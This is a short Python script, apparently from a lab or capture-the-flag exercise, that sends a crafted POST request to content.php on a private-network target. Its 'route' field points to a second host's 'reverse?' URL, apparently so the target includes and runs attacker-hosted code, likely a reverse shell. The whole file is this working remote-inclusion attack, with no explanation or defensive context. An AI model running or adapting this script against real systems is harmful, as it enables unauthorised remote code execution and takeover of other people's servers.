#!/usr/bin/env python
#send post requst to the target

import requests
import json

url= 'http://192.168.41.154/content.php'

headers = {
	"Host" : "192.168.41.154",
	"User-Agent" : "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0",
	"Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Accept-Language" : "en-US,en;q=0.5",
	"Accept-Encoding" : "gzip, deflate",
	"Referer" : "http://192.168.41.154/nav.php",
	"Connection" : "keep-alive",
	"Content-Type" : "application/x-www-form-urlencoded",
	"Content-Length" : "40"
}

payload = {
	"route" : "http://192.168.41.149/reverse?"
}


r = requests.post(url, headers=headers, data=payload)
print (r.status_code)
